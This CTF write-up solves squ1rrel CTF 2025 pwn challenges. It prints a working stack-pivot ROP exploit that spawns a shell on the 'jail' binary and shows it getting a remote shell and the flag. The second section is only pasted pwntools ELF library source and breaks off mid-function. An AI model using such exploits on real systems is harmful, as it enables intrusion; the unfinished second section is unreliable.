---
title: "[WRITE UP] - squ1rrel CTF 2025"
date: 2025-04-07 20:30:00
tags:
  - PWN
category: "CTF Write ups"
---

This is a pretty good CTF with a lot of good challenges. This will be the write up for 2/3 of the problems that I solved.

## pwn/jail!

### Challenge Information

Description: `I want to become a dentist! A DENTIST?!`
Tags:

- Buffer Overflow
- Stack Pivot

### Reverse Engineering

```sh
[*] '/mnt/e/sec/CTFs/2025/squ1relCTF/jail/prison'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

So we have 64-bit ELF with no PIE

```c
__int64 __fastcall prison(__int64 a1, int a2, int a3, int a4, int a5, int a6)
{
  int v6; // edx
  int v7; // ecx
  int v8; // r8d
  int v9; // r9d
  __int64 n10; // rax
  int v11; // ecx
  int v12; // r8d
  int v13; // r9d
  int v14; // esi
  int v15; // edx
  int v16; // ecx
  int v17; // r8d
  int v18; // r9d
  __int64 v19; // [rsp+0h] [rbp-80h]
  int v20; // [rsp+3Ch] [rbp-44h] BYREF
  _BYTE v21[64]; // [rsp+40h] [rbp-40h] BYREF

  printf(
    (unsigned int)"They gave you the premium stay so at least you get to choose your cell (1-6): ",
    a2,
    a3,
    a4,
    a5,
    a6,
    "The Professor",
    "Empty Cell",
    "Jay. L. Thyme",
    "Jay. L. Thyme's Wife",
    "Jay. L. Thyme's Wife's Boyfriend",
    "Rob Banks");
  if ( (unsigned int)_isoc99_scanf((unsigned int)"%d", (unsigned int)&v20, v6, v7, v8, v9, v19) == 1 )
  {
    while ( (unsigned int)getchar() != 10 )
      ;
    v14 = v20;
    printf((unsigned int)"Cell #%d: Your cellmate is %s\n", v20, *(&v19 + v20 - 1), v11, v12, v13);
    printf((unsigned int)"Now let's get the registry updated. What is your name: ", v14, v15, v16, v17, v18);
    fgets(v21, 100LL, stdin);
    puts("...");
    sleep(3LL);
    puts("...");
    return puts("What did you expect. You're in here for life this is what it looks like for the rest.");
  }
  else
  {
    puts("Invalid input!");
    do
      n10 = getchar();
    while ( (_DWORD)n10 != 10 );
  }
  return n10;
}
```

In the pseudo-code above, we can see that there is one buffer overflow. A buffer overflow happens when a program writes too much data into a small area in memory.

Even though `checksec` shows that the binary has a canary, it actually does not. This is because the binary is compiled in static mode. When a binary is compiled in static mode, some functions include a canary by default. This makes `checksec` think that the whole binary is protected by a canary, even though it is not. In this case, the appearance of a canary is only due to the way the binary was compiled (compile in static mode), not because the program is truly protected.

### Exploit Development

So we have `Buffer Overflow` here, next we need to check with that input length (100 bytes) how much we can overwrite.

```c
00:0000│ rsp 0x7fffffffdbe8 ◂— 'jaaaaaaakaaaaaaalaaaaaaamaa'
01:0008│     0x7fffffffdbf0 ◂— 'kaaaaaaalaaaaaaamaa'
02:0010│     0x7fffffffdbf8 ◂— 'laaaaaaamaa'
03:0018│     0x7fffffffdc00 ◂— 0x7fff0061616d /* 'maa' */
04:0020│     0x7fffffffdc08 —▸ 0x7fffffffdd08 —▸ 0x7fffffffdf9d ◂— '/mnt/e/sec/CTFs/2025/squ1relCTF/jail/prison'
05:0028│     0x7fffffffdc10 ◂— 0x1004017cf
06:0030│     0x7fffffffdc18 —▸ 0x401b56 (main) ◂— endbr64
07:0038│     0x7fffffffdc20 ◂— 1
```

We can only overwrite memory up to `rbp+0x10`. This means there is not enough space to build a full ROP chain that leaks information and returns to main. Because of this, we can use a technique called `Stack Pivot`. With a `stack pivot`, we change the stack pointer to a different location that has more space. This way, we do not worry about the limited input length, and we can build our ROP chain in a larger area of memory.

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./prison', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

b *0x401B18
b *0x401B55

c
'''.format(**locals())

# ==================== EXPLOIT ====================

def init():
    global p

    p = start()

def exploit():

    offset = 0x40
    pop_rdi = 0x401a0d
    pop_rax = 0x41f464
    pop_rsi = 0x413676
    syscall = 0x4013b8
    leave_ret = 0x401b54
    rw_section = 0x4cb800
    fgets_gadget = 0x401B05

    sl(b'1')

    payload = flat({

        offset: [

            rw_section,
            fgets_gadget

        ]

    })

    sla(b'name: ', payload)

    payload = flat({

        0: [
            pop_rdi,
            rw_section + 0x10,
            pop_rsi, 0, 0,
            pop_rax,
            0x3b,
            syscall,
        ],

        0x40: [
            rw_section - 0x40 - 0x8,
            leave_ret,
            b'/bin/sh\0'
        ]

    }, filler=b'A')

    print(len(payload))
    sl(payload)

    interactive()

def main():

    init()
    exploit()

if __name__ == '__main__':
    main()
```

### Get flag

```sh
┌─ [22:50] ❄ alter in /mnt/e/sec/CTFs/2025/squ1relCTF/jail ⚲
└ ϟ ./exploit.py REMOTE 20.84.72.194
[+] Opening connection to 20.84.72.194 on port 5001: Done
88
[*] Switching to interactive mode
...
...
What did you expect. You're in here for life this is what it looks like for the rest.
...
...
What did you expect. You're in here for life this is what it looks like for the rest.
$ cat flag*
squ1rrel{m4n_0n_th3_rUn_fr0m_NX_pr1s0n!}
$
```

## pwn/Extremely Lame Filters 1

### Challenge Information

Description: `why weren't you at ELF practice?!`

Tags:

- Binary Golfing
- Shellcode Injection

### Analysis

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#  mayhem/datatypes/elf.py
#
#  Redistribution and use in source and binary forms, with or without
#  modification, are permitted provided that the following conditions are
#  met:
#
#  * Redistributions of source code must retain the above copyright
#    notice, this list of conditions and the following disclaimer.
#  * Redistributions in binary form must reproduce the above
#    copyright notice, this list of conditions and the following disclaimer
#    in the documentation and/or other materials provided with the
#    distribution.
#  * Neither the name of the project nor the names of its
#    contributors may be used to endorse or promote products derived from
#    this software without specific prior written permission.
#
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
#  "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
#  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
#  A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
#  OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
#  SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
#  LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
#  DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
#  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
#  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
#
from __future__ import division

import ctypes

Elf32_Addr = ctypes.c_uint32
Elf32_Half = ctypes.c_uint16
Elf32_Off = ctypes.c_uint32
Elf32_Sword = ctypes.c_int32
Elf32_Word = ctypes.c_uint32

Elf64_Addr = ctypes.c_uint64
Elf64_Half = ctypes.c_uint16
Elf64_SHalf = ctypes.c_int16
Elf64_Off = ctypes.c_uint64
Elf64_Sword = ctypes.c_int32
Elf64_Word = ctypes.c_uint32
Elf64_Xword = ctypes.c_uint64
Elf64_Sxword = ctypes.c_int64


AT_CONSTANTS = {
    0 : 'AT_NULL',      # /* End of vector */
    1 : 'AT_IGNORE',    # /* Entry should be ignored */
    2 : 'AT_EXECFD',    # /* File descriptor of program */
    3 : 'AT_PHDR',      # /* Program headers for program */
    4 : 'AT_PHENT',     # /* Size of program header entry */
    5 : 'AT_PHNUM',     # /* Number of program headers */
    6 : 'AT_PAGESZ',    # /* System page size */
    7 : 'AT_BASE',      # /* Base address of interpreter */
    8 : 'AT_FLAGS',     # /* Flags */
    9 : 'AT_ENTRY',     # /* Entry point of program */
    10: 'AT_NOTELF',    # /* Program is not ELF */
    11: 'AT_UID',       # /* Real uid */
    12: 'AT_EUID',      # /* Effective uid */
    13: 'AT_GID',       # /* Real gid */
    14: 'AT_EGID',      # /* Effective gid */
    15: 'AT_PLATFORM',  # /* String identifying platform */
    16: 'AT_HWCAP',     # /* Machine dependent hints about processor capabilities */
    17: 'AT_CLKTCK',    # /* Frequency of times() */
    18: 'AT_FPUCW',
    19: 'AT_DCACHEBSIZE',
    20: 'AT_ICACHEBSIZE',
    21: 'AT_UCACHEBSIZE',
    22: 'AT_IGNOREPPC',
    23: 'AT_SECURE',
    24: 'AT_BASE_PLATFORM', # String identifying real platforms
    25: 'AT_RANDOM',    # Address of 16 random bytes
    31: 'AT_EXECFN',    # Filename of executable
    32: 'AT_SYSINFO',
    33: 'AT_SYSINFO_EHDR',
    34: 'AT_L1I_CACHESHAPE',
    35: 'AT_L1D_CACHESHAPE',
    36: 'AT_L2_CACHESHAPE',
    37: 'AT_L3_CACHESHAPE',
}

class constants:
    EI_MAG0                 = 0
    EI_MAG1                 = 1
    EI_MAG2                 = 2
    EI_MAG3                 = 3
    EI_CLASS                = 4
    EI_DATA                 = 5
    EI_VERSION              = 6
    EI_OSABI                = 7
    EI_ABIVERSION           = 8
    EI_PAD                  = 9
    EI_NIDENT               = 16

    ELFMAG0                 = 0x7f
    ELFMAG1                 = ord('E')
    ELFMAG2                 = ord('L')
    ELFMAG3                 = ord('F')

    ELFCLASSNONE            = 0
    ELFCLASS32              = 1
    ELFCLASS64              = 2

    ELFDATANONE             = 0
    ELFDATA2LSB             = 1
    ELFDATA2MSB             = 2

    # Legal values for Elf_Phdr.p_type (segment type).
    PT_NULL                 = 0
    PT_LOAD                 = 1
    PT_DYNAMIC              = 2
    PT_INTERP               = 3
    PT_NOTE                 = 4
    PT_SHLIB                = 5
    PT_PHDR                 = 6
    PT_TLS                  = 7

    # Legal values for Elf_Ehdr.e_type (object file type).
    ET_NONE                 = 0
    ET_REL                  = 1
    ET_EXEC                 = 2
    ET_DYN                  = 3
    ET_CORE                 = 4

    # Legal values for Elf_Dyn.d_tag (dynamic entry type).
    DT_NULL                 = 0
    DT_NEEDED               = 1
    DT_PLTRELSZ             = 2
    DT_PLTGOT               = 3
    DT_HASH                 = 4
    DT_STRTAB               = 5
    DT_SYMTAB               = 6
    DT_RELA                 = 7
    DT_RELASZ               = 8
    DT_RELAENT              = 9
    DT_STRSZ                = 10
    DT_SYMENT               = 11
    DT_INIT                 = 12
    DT_FINI                 = 13
    DT_SONAME               = 14
    DT_RPATH                = 15
    DT_SYMBOLIC             = 16
    DT_REL                  = 17
    DT_RELSZ                = 18
    DT_RELENT               = 19
    DT_PLTREL               = 20
    DT_DEBUG                = 21
    DT_TEXTREL              = 22
    DT_JMPREL               = 23
    DT_ENCODING             = 32
    DT_FLAGS_1 = 0x000000006ffffffb
    DT_VERNEED = 0x000000006ffffffe
    DT_VERNEEDNUM = 0x000000006fffffff
    DT_VERSYM = 0x000000006ffffff0
    DT_RELACOUNT = 0x000000006ffffff9
    DT_GNU_HASH = 0x000000006ffffef5

    # Legal values for Elf_Shdr.sh_type (section type).
    SHT_NULL                = 0
    SHT_PROGBITS            = 1
    SHT_SYMTAB              = 2
    SHT_STRTAB              = 3
    SHT_RELA                = 4
    SHT_HASH                = 5
    SHT_DYNAMIC             = 6
    SHT_NOTE                = 7
    SHT_NOBITS              = 8
    SHT_REL                 = 9
    SHT_SHLIB               = 10
    SHT_DYNSYM              = 11
    SHT_NUM                 = 12

    # Legal values for ST_TYPE subfield of Elf_Sym.st_info (symbol type).
    STT_NOTYPE              = 0
    STT_OBJECT              = 1
    STT_FUNC                = 2
    STT_SECTION             = 3
    STT_FILE                = 4
    STT_COMMON              = 5
    STT_TLS                 = 6
    STT_GNU_IFUNC           = 10

    SHN_UNDEF               = 0
    SHN_ABS                 = 0xfff1
    SHN_COMMON              = 0xfff2

    #
    # Notes used in ET_CORE. Architectures export some of the arch register sets
    # using the corresponding note types via the PTRACE_GETREGSET and
    # PTRACE_SETREGSET requests.
    #
    NT_PRSTATUS             = 1
    NT_PRFPREG              = 2
    NT_PRPSINFO             = 3
    NT_TASKSTRUCT           = 4
    NT_AUXV                 = 6
    #
    # Note to userspace developers: size of NT_SIGINFO note may increase
    # in the future to accommodate more fields, don't assume it is fixed!
    #
    NT_SIGINFO              = 0x53494749
    NT_FILE                 = 0x46494c45
    NT_PRXFPREG             = 0x46e62b7f
    NT_PPC_VMX              = 0x100
    NT_PPC_SPE              = 0x101
    NT_PPC_VSX              = 0x102
    NT_386_TLS              = 0x200
    NT_386_IOPERM           = 0x201
    NT_X86_XSTATE           = 0x202
    NT_S390_HIGH_GPRS       = 0x300
    NT_S390_TIMER           = 0x301
    NT_S390_TODCMP          = 0x302
    NT_S390_TODPREG         = 0x303
    NT_S390_CTRS            = 0x304
    NT_S390_PREFIX          = 0x305
    NT_S390_LAST_BREAK      = 0x306
    NT_S390_SYSTEM_CALL     = 0x307
    NT_S390_TDB             = 0x308
    NT_ARM_VFP              = 0x400
    NT_ARM_TLS              = 0x401
    NT_ARM_HW_BREAK         = 0x402
    NT_ARM_HW_WATCH         = 0x403
    NT_METAG_CBUF           = 0x500
    NT_METAG_RPIPE          = 0x501
    NT_METAG_TLS            = 0x502

    AT_NULL                 = 0
    AT_IGNORE               = 1
    AT_EXECFD               = 2
    AT_PHDR                 = 3
    AT_PHENT                = 4
    AT_PHNUM                = 5
    AT_PAGESZ               = 6
    AT_BASE                 = 7
    AT_FLAGS                = 8
    AT_ENTRY                = 9
    AT_NOTELF               = 10
    AT_UID                  = 11
    AT_EUID                 = 12
    AT_GID                  = 13
    AT_EGID                 = 14
    AT_PLATFORM             = 15
    AT_HWCAP                = 16
    AT_CLKTCK               = 17
    AT_FPUCW                = 18
    AT_DCACHEBSIZE          = 19
    AT_ICACHEBSIZE          = 20
    AT_UCACHEBSIZE          = 21
    AT_IGNOREPPC            = 22
    AT_SECURE               = 23
    AT_BASE_PLATFORM        = 24
    AT_RANDOM               = 25
    AT_EXECFN               = 31
    AT_SYSINFO              = 32
    AT_SYSINFO_EHDR         = 33
    AT_L1I_CACHESHAPE       = 34
    AT_L1D_CACHESHAPE       = 35
    AT_L2_CACHESHAPE        = 36
    AT_L3_CACHESHAPE        = 37

    # Legal flags used in the d_val field of the DT_FLAGS dynamic entry.
    DF_ORIGIN               = 0x01
    DF_SYMBOLIC             = 0x02
    DF_TEXTREL              = 0x04
    DF_BIND_NOW             = 0x08
    DF_STATIC_TLS           = 0x10

    # Legal flags used in the d_val field of the DT_FLAGS_1 dynamic entry.
    DF_1_NOW                = 0x00000001
    DF_1_GLOBAL             = 0x00000002
    DF_1_GROUP              = 0x00000004
    DF_1_NODELETE           = 0x00000008
    DF_1_LOADFLTR           = 0x00000010
    DF_1_INITFIRST          = 0x00000020
    DF_1_NOOPEN             = 0x00000040
    DF_1_ORIGIN             = 0x00000080
    DF_1_DIRECT             = 0x00000100
    DF_1_TRANS              = 0x00000200
    DF_1_INTERPOSE          = 0x00000400
    DF_1_NODEFLIB           = 0x00000800
    DF_1_NODUMP             = 0x00001000
    DF_1_CONFALT            = 0x00002000
    DF_1_ENDFILTEE          = 0x00004000
    DF_1_DISPRELDNE         = 0x00008000
    DF_1_DISPRELPND         = 0x00010000
    DF_1_NODIRECT           = 0x00020000
    DF_1_IGNMULDEF          = 0x00040000
    DF_1_NOKSYMS            = 0x00080000
    DF_1_NOHDR              = 0x00100000
    DF_1_EDITED             = 0x00200000
    DF_1_NORELOC            = 0x00400000
    DF_1_SYMINTPOSE         = 0x00800000
    DF_1_GLOBAUDIT          = 0x01000000
    DF_1_SINGLETON          = 0x02000000
    DF_1_STUB	            = 0x04000000
    DF_1_PIE                = 0x08000000

    R_X86_64_NONE           = 0
    R_X86_64_64             = 1
    R_X86_64_PC32           = 2
    R_X86_64_GOT32          = 3
    R_X86_64_PLT32          = 4
    R_X86_64_COPY           = 5
    R_X86_64_GLOB_DAT       = 6
    R_X86_64_JUMP_SLOT      = 7
    R_X86_64_RELATIVE       = 8
    R_X86_64_GOTPCREL       = 9
    R_X86_64_32             = 10
    R_X86_64_32S            = 11
    R_X86_64_16             = 12
    R_X86_64_PC16           = 13
    R_X86_64_8              = 14
    R_X86_64_PC8            = 15
    R_X86_64_DPTMOD64       = 16
    R_X86_64_DTPOFF64       = 17
    R_X86_64_TPOFF64        = 18
    R_X86_64_TLSGD          = 19
    R_X86_64_TLSLD          = 20
    R_X86_64_DTPOFF32       = 21
    R_X86_64_GOTTPOFF       = 22
    R_X86_64_TPOFF32        = 23
    R_X86_64_PC64           = 24
    R_X86_64_GOTOFF64       = 25
    R_X86_64_GOTPC32        = 26
    R_X86_64_GOT64		    = 27
    R_X86_64_GOTPCREL64	    = 28
    R_X86_64_GOTPC64	    = 29
    R_X86_64_GOTPLT64	    = 30
    R_X86_64_PLTOFF64	    = 31
    R_X86_64_SIZE32		    = 32
    R_X86_64_SIZE64		    = 33
    R_X86_64_GOTPC32_TLSDESC = 34
    R_X86_64_TLSDESC_CALL   = 35
    R_X86_64_TLSDESC        = 36
    R_X86_64_IRELATIVE	    = 37
    R_X86_64_RELATIVE64	    = 38
    R_X86_64_GOTPCRELX	    = 41
    R_X86_64_REX_GOTPCRELX	= 42
    R_X86_64_NUM		    = 43


class Elf32_Ehdr(ctypes.Structure):
    _fields_ = [("e_ident", (ctypes.c_ubyte * 16)),
                ("e_type", Elf32_Half),
                ("e_machine", Elf32_Half),
                ("e_version", Elf32_Word),
                ("e_entry", Elf32_Addr),
                ("e_phoff", Elf32_Off),
                ("e_shoff", Elf32_Off),
                ("e_flags", Elf32_Word),
                ("e_ehsize", Elf32_Half),
                ("e_phentsize", Elf32_Half),
                ("e_phnum", Elf32_Half),
                ("e_shentsize", Elf32_Half),
                ("e_shnum", Elf32_Half),
                ("e_shstrndx", Elf32_Half),]

class Elf64_Ehdr(ctypes.Structure):
    _fields_ = [("e_ident", (ctypes.c_ubyte * 16)),
                ("e_type", Elf64_Half),
                ("e_machine", Elf64_Half),
                ("e_version", Elf64_Word),
                ("e_entry", Elf64_Addr),
                ("e_phoff", Elf64_Off),
                ("e_shoff", Elf64_Off),
                ("e_flags", Elf64_Word),
                ("e_ehsize", Elf64_Half),
                ("e_phentsize", Elf64_Half),
                ("e_phnum", Elf64_Half),
                ("e_shentsize", Elf64_Half),
                ("e_shnum", Elf64_Half),
                ("e_shstrndx", Elf64_Half),]

class Elf32_Phdr(ctypes.Structure):
    _fields_ = [("p_type", Elf32_Word),
                ("p_offset", Elf32_Off),
                ("p_vaddr", Elf32_Addr),
                ("p_paddr", Elf32_Addr),
                ("p_filesz", Elf32_Word),
                ("p_memsz", Elf32_Word),
                ("p_flags", Elf32_Word),
                ("p_align", Elf32_Word),]

class Elf64_Phdr(ctypes.Structure):
    _fields_ = [("p_type", Elf64_Word),
                ("p_flags", Elf64_Word),
                ("p_offset", Elf64_Off),
                ("p_vaddr", Elf64_Addr),
                ("p_paddr", Elf64_Addr),
                ("p_filesz", Elf64_Xword),
                ("p_memsz", Elf64_Xword),
                ("p_align", Elf64_Xword),]

class Elf32_Shdr(ctypes.Structure):
    _fields_ = [("sh_name", Elf32_Word),
                ("sh_type", Elf32_Word),
                ("sh_flags", Elf32_Word),
                ("sh_addr", Elf32_Addr),
                ("sh_offset", Elf32_Off),
                ("sh_size", Elf32_Word),
                ("sh_link", Elf32_Word),
                ("sh_info", Elf32_Word),
                ("sh_addralign", Elf32_Word),
                ("sh_entsize", Elf32_Word),]

class Elf64_Shdr(ctypes.Structure):
    _fields_ = [("sh_name", Elf64_Word),
                ("sh_type", Elf64_Word),
                ("sh_flags", Elf64_Xword),
                ("sh_addr", Elf64_Addr),
                ("sh_offset", Elf64_Off),
                ("sh_size", Elf64_Xword),
                ("sh_link", Elf64_Word),
                ("sh_info", Elf64_Word),
                ("sh_addralign", Elf64_Xword),
                ("sh_entsize", Elf64_Xword),]

class _U__Elf32_Dyn(ctypes.Union):
    _fields_ = [("d_val", Elf32_Sword),
                ("d_ptr", Elf32_Addr),]

class Elf32_Dyn(ctypes.Structure):
    _anonymous_ = ("d_un",)
    _fields_ = [("d_tag", Elf32_Sword),
                ("d_un", _U__Elf32_Dyn),]

class _U__Elf64_Dyn(ctypes.Union):
    _fields_ = [("d_val", Elf64_Xword),
                ("d_ptr", Elf64_Addr),]

class Elf64_Dyn(ctypes.Structure):
    _anonymous_ = ("d_un",)
    _fields_ = [("d_tag", Elf64_Sxword),
                ("d_un", _U__Elf64_Dyn),]

class Elf32_Sym(ctypes.Structure):
    _fields_ = [("st_name", Elf32_Word),
                ("st_value", Elf32_Addr),
                ("st_size", Elf32_Word),
                ("st_info", ctypes.c_ubyte),
                ("st_other", ctypes.c_ubyte),
                ("st_shndx", Elf32_Half),]

class Elf64_Sym(ctypes.Structure):
    _fields_ = [("st_name", Elf64_Word),
                ("st_info", ctypes.c_ubyte),
                ("st_other", ctypes.c_ubyte),
                ("st_shndx", Elf64_Half),
                ("st_value", Elf64_Addr),
                ("st_size", Elf64_Xword),]

    @property
    def st_type(self):
        return self.st_info & 0x0f

    @property
    def st_bind(self):
        return self.st_info >> 4

    @st_type.setter
    def st_type(self, value):
        value &= 0x0f
        self.st_info = (self.st_bind << 4) | value

    @st_bind.setter
    def st_bind(self, value):
        value &= 0x0f
        self.st_info = (value << 4) | self.st_type

class Elf64_Rel(ctypes.Structure):
    _fields_ = [("r_offset", Elf64_Addr),
                ("r_info", Elf64_Xword),]

    @property
    def r_sym(self):
        return self.r_info >> 32

    @property
    def r_type(self):
        return self.r_info % (1 << 32)

    @r_sym.setter
    def r_sym(self, value):
        value %= (1 << 32)
        self.r_info = (value << 32) | self.r_type

    @r_type.setter
    def r_type(self, value):
        value %= (1 << 32)
        self.r_info = (self.r_sym << 32) | value

class Elf64_Rela(ctypes.Structure):
    _fields_ = [("r_offset", Elf64_Addr),
                ("r_info", Elf64_Xword),
                ("r_addend", Elf64_Sxword),]

    @property
    def r_sym(self):
        return self.r_info >> 32

    @property
    def r_type(self):
        return self.r_info % (1 << 32)

    @r_sym.setter
    def r_sym(self, value):
        value %= (1 << 32)
        self.r_info = (value << 32) | self.r_type

    @r_type.setter
    def r_type(self, value):
        value %= (1 << 32)
        self.r_info = (self.r_sym << 32) | value

class Elf32_Link_Map(ctypes.Structure):
    _fields_ = [("l_addr", Elf32_Addr),
                ("l_name", Elf32_Addr),
                ("l_ld", Elf32_Addr),
                ("l_next", Elf32_Addr),
                ("l_prev", Elf32_Addr),]

class Elf64_Link_Map(ctypes.Structure):
    _fields_ = [("l_addr", Elf64_Addr),
                ("l_name", Elf64_Addr),
                ("l_ld",   Elf64_Addr),
                ("l_next", Elf64_Addr),
                ("l_prev", Elf64_Addr),]


#
# Additions below here by Zach Riggle for pwntool
#
# See the routine elf_machine_runtime_setup for the relevant architecture
# for the layout of the GOT.
#
# https://chromium.googlesource.com/chromiumos/third_party/glibc/+/master/sysdeps/x86/dl-machine.h
# https://chromium.googlesource.com/chromiumos/third_party/glibc/+/master/sysdeps/x86_64/dl-machine.h
# https://fossies.org/dox/glibc-2.20/aarch64_2dl-machine_8h_source.html#l00074
# https://fossies.org/dox/glibc-2.20/powerpc32_2dl-machine_8c_source.html#l00203
#
# For now, these are defined for x86 and x64
#
char = ctypes.c_char
byte = ctypes.c_byte

class Elf_eident(ctypes.Structure):
    _fields_ = [('EI_MAG',char*4),
                ('EI_CLASS',byte),
                ('EI_DATA',byte),
                ('EI_VERSION',byte),
                ('EI_OSABI',byte),
                ('EI_ABIVERSION',byte),
                ('EI_PAD', byte*(16-9))]

class Elf_i386_GOT(ctypes.Structure):
    _fields_ = [("jmp", Elf32_Addr),
                ("linkmap", Elf32_Addr),
                ("dl_runtime_resolve", Elf32_Addr)]
class Elf_x86_64_GOT(ctypes.Structure):
    _fields_ = [("jmp", Elf64_Addr),
                ("linkmap", Elf64_Addr),
                ("dl_runtime_resolve", Elf64_Addr)]

class Elf_HashTable(ctypes.Structure):
    _fields_ = [('nbucket', Elf32_Word),
                ('nchain', Elf32_Word),]
              # ('bucket', nbucket * Elf32_Word),
              # ('chain',  nchain * Elf32_Word)]

# Docs: http://dyncall.org/svn/dyncall/tags/r0.4/dyncall/dynload/dynload_syms_elf.c
class GNU_HASH(ctypes.Structure):
    _fields_ = [('nbuckets',  Elf32_Word),
                ('symndx',    Elf32_Word),
                ('maskwords', Elf32_Word),
                ('shift2',    Elf32_Word)]

class Elf32_r_debug(ctypes.Structure):
    _fields_ = [('r_version', Elf32_Word),
                ('r_map', Elf32_Addr)]

class Elf64_r_debug(ctypes.Structure):
    _fields_ = [('r_version', Elf32_Word),
                ('r_map', Elf64_Addr)]

constants.DT_GNU_HASH = 0x6ffffef5
constants.STN_UNDEF   = 0

pid_t = ctypes.c_uint32

class elf_siginfo(ctypes.Structure):
    _fields_ = [('si_signo', ctypes.c_int32),
                ('si_code', ctypes.c_int32),
                ('si_errno', ctypes.c_int32)]

class timeval32(ctypes.Structure):
    _fields_ = [('tv_sec', ctypes.c_int32),
                ('tv_usec', ctypes.c_int32),]

class timeval64(ctypes.Structure):
    _fields_ = [('tv_sec', ctypes.c_int64),
                ('tv_usec', ctypes.c_int64),]

# See linux/elfcore.h
def generate_prstatus_common(size, regtype):
    c_long = ctypes.c_uint32 if size==32 else ctypes.c_uint64
    timeval = timeval32 if size==32 else timeval64

    return [('pr_info', elf_siginfo),
            ('pr_cursig', ctypes.c_int16),
            ('pr_sigpend', c_long),
            ('pr_sighold', c_long),
            ('pr_pid', pid_t),
            ('pr_ppid', pid_t),
            ('pr_pgrp', pid_t),
            ('pr_sid', pid_t),
            ('pr_utime', timeval),
            ('pr_stime', timeval),
            ('pr_cutime', timeval),
            ('pr_cstime', timeval),
            ('pr_reg', regtype),
            ('pr_fpvalid', ctypes.c_uint32)
            ]

# See i386-linux-gnu/sys/user.h
class user_regs_struct_i386(ctypes.Structure):
    _fields_ = [(name, ctypes.c_uint32) for name in [
                'ebx',
                'ecx',
                'edx',
                'esi',
                'edi',
                'ebp',
                'eax',
                'xds',
                'xes',
                'xfs',
                'xgs',
                'orig_eax',
                'eip',
                'xcs',
                'eflags',
                'esp',
                'xss',
                ]]


assert ctypes.sizeof(user_regs_struct_i386) == 0x44


# See i386-linux-gnu/sys/user.h
class user_regs_struct_amd64(ctypes.Structure):
    _fields_ = [(name, ctypes.c_uint64) for name in [
                'r15',
                'r14',
                'r13',
                'r12',
                'rbp',
                'rbx',
                'r11',
                'r10',
                'r9',
                'r8',
                'rax',
                'rcx',
                'rdx',
                'rsi',
                'rdi',
                'orig_rax',
                'rip',
                'cs',
                'eflags',
                'rsp',
                'ss',
                'fs_base',
                'gs_base',
                'ds',
                'es',
                'fs',
                'gs',
                ]]

assert ctypes.sizeof(user_regs_struct_amd64) == 0xd8

class user_regs_struct_arm(ctypes.Structure):
    _fields_ = [('r%i' % i, ctypes.c_uint32) for i in range(18)]

    @property
    def cpsr(self):
        return self.r16
    @property
    def pc(self):
        return self.r15
    @property
    def lr(self):
        return self.r14
    @property
    def sp(self):
        return self.r13
    @property
    def ip(self):
        return self.r12
    @property
    def fp(self):
        return self.r11


class user_regs_struct_aarch64(ctypes.Structure):
    _fields_ = [('x%i' % i, ctypes.c_uint64) for i in range(31)] \
             + [('sp', ctypes.c_uint64),
                ('pc', ctypes.c_uint64),
                ('pstate', ctypes.c_uint64)]

    @property
    def lr(self):
        return self.x30

    def __getattr__(self, name):
        if name.startswith('r'):
            name = 'x' + name[1:]
            return getattr(self, name) & 0xffffffff
        raise AttributeError(name)

class elf_prstatus_i386(ctypes.Structure):
    _fields_ = generate_prstatus_common(32, user_regs_struct_i386)

assert ctypes.sizeof(elf_prstatus_i386) == 0x90

class elf_prstatus_amd64(ctypes.Structure):
    _fields_ = generate_prstatus_common(64, user_regs_struct_amd64) \
             + [('padding', ctypes.c_uint32)]

assert ctypes.sizeof(elf_prstatus_amd64) == 0x150

class elf_prstatus_arm(ctypes.Structure):
    _fields_ = generate_prstatus_common(32, user_regs_struct_arm)

class elf_prstatus_aarch64(ctypes.Structure):
    _fields_ = generate_prstatus_common(64, user_regs_struct_aarch64)

class Elf32_auxv_t(ctypes.Structure):
    _fields_ = [('a_type', ctypes.c_uint32),
                ('a_val', ctypes.c_uint32),]
class Elf64_auxv_t(ctypes.Structure):
    _fields_ = [('a_type', ctypes.c_uint64),
                ('a_val', ctypes.c_uint64),]

def generate_prpsinfo(long):
    return [
        ('pr_state', byte),
        ('pr_sname', char),
        ('pr_zomb', byte),
        ('pr_nice', byte),
        ('pr_flag', long),
        ('pr_uid', ctypes.c_ushort),
        ('pr_gid', ctypes.c_ushort),
        ('pr_pid', ctypes.c_int),
        ('pr_ppid', ctypes.c_int),
        ('pr_pgrp', ctypes.c_int),
        ('pr_sid', ctypes.c_int),
        ('pr_fname', char * 16),
        ('pr_psargs', char * 80)
    ]

class elf_prpsinfo_32(ctypes.Structure):
    _fields_ = generate_prpsinfo(Elf32_Addr)

class elf_prpsinfo_64(ctypes.Structure):
    _fields_ = generate_prpsinfo(Elf64_Addr)

def generate_siginfo(int_t, long_t):
